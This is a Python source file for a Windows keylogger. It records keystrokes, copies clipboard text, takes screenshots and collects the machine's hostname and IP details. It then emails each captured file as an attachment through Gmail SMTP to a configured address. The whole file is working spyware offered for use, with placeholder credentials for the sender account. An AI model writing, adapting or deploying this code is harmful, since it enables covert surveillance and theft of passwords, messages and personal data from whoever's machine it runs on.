#for email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#for pc info
import socket
import platform

#for clipboard functionality
import win32clipboard

import time
import os

#for taking screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#for keylogging
from pynput.keyboard import Key, Listener


path = r"C:\Users\XXXXX\XXXX\keylogger"
extend = "\\"
merge_files = path + extend
keyinfo = "log.txt"
pcinfo = "computer_info.txt"
clipboard = "clipboard.txt"
screenshot = "screenshot.png"
email_address = "yourmail@gmail.com"
password = "zxXXXXXXXXXXabcd" #you can only use app password here, to know more visit: https://support.google.com/accounts/answer/185833
toaddr = "yourmail@gmail.com"


# how to send email idea taken from realpython and geekforgeeks
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg["from"] = fromaddr

    msg["to"] = toaddr

    msg["subject"] = "Keylog_file"

    body = "Body of the keylog_file"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename

    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', 'attachment; filename="%s"' % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keyinfo, merge_files+ keyinfo, toaddr)

#count = 0
# filenames = [merge_files + keyinfo, merge_files + pcinfo, merge_files + clipboard + merge_files + screenshot]
#
# send_email(filenames[count], filenames[count], toaddr)
# count += 1


#to get sysytem info
def sysinfo():
    with open(path + extend + pcinfo, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get('https://api.ipify.org').text
            f.write('Public Ip Add is: ' + public_ip + '\n')

        except Exception:
            f.write('Could not get public IP address')

        f.write('Processor: ' + (platform.processor()) + '\n')
        f.write('System: ' + platform.system() + ' ' + platform.version() + '\n')
        f.write('Machine: ' + platform.machine() + '\n')
        f.write('Hostname: ' + hostname + '\n')
        f.write('Ip Address: ' + IPAddr + '\n')

sysinfo()

send_email(pcinfo, merge_files + pcinfo, toaddr)

#to copy clipboard content
def clipboard_info():
    with open(path + extend +  clipboard, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write('Clipboard text: ' + '\n' + pasted_data)

        except Exception:
            f.write("Coudn't have clipboard")

clipboard_info()

send_email(clipboard, merge_files + clipboard, toaddr)

#to take and save screenshot
def screenshot_info():
    im = ImageGrab.grab()
    im.save(path + extend + screenshot)

screenshot_info()

send_email(screenshot, merge_files + screenshot, toaddr)


keys = []
count = 0

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # print("{0}".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(path + extend + keyinfo, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(' ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif 'Key' not in k:
                f.write(k)


'''To have a key to exit out of the keylogger,
this can also be skipped and then also remove "on_release" function as well'''


def on_release(key):
    with open(path + extend + keyinfo, 'a') as f:
        if key == Key.esc:
            f.write('\nsession ended\n')
            return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



